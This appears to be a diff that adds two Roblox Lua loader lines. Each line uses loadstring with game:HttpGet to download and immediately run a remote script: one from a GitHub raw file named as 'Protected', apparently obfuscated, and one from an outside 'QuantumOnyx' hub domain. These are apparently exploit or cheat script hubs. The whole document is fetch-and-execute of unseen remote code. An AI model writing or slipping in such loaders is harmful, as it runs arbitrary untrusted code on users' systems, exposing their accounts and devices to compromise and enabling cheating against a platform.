@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/D3athFeather/Script/main/Protected_a1e2a7bc971aaaf7787885c8.lua"))()
+
+loadstring(game:HttpGet("https://quantumonyx.xyz/QuantumOnyxTeamMainHub.lua"))()
